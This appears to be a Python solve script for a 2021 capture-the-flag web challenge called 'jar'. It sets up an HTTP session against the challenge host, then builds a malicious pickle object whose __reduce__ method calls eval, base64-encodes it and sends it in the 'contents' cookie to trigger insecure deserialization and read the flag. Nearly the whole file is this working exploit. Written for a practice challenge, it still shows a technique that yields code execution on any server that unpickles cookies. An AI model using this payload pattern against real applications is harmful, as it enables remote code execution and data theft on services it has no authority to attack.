### HTTP Interface ##########################################
import requests
URL = 'https://jar.2021.chall.actf.co/'
r = requests.Session()

def showResponse(response):
    print(response.text)
    print(response)
    print(response.headers)
    print(response.cookies)
    print(r.cookies)

def add(item="a", contents=None):
    if contents != None: r.cookies.set("contents",contents)
    print(r.cookies)
    data = {'item':item}
    response = r.post(URL+"/add", data=data)
    showResponse(response)
    print("#"*100)

#add()

def jar(contents=None):
    if contents != None: r.cookies.set("contents",contents)
    data = {}
    response = r.get(URL, params=data) #headers=headers)
    showResponse(response)

#jar()

### Code Injection ##################################################

import pickle
import base64
import os

def passs(a):
    pass

class SpecialList():
    def __reduce__(self):
        return eval, ("[flag]", )

pickled = pickle.dumps(SpecialList())
payload = base64.urlsafe_b64encode(pickled).decode()
print(payload)
### Final ########################################################
#add("a", payload)
jar(payload)
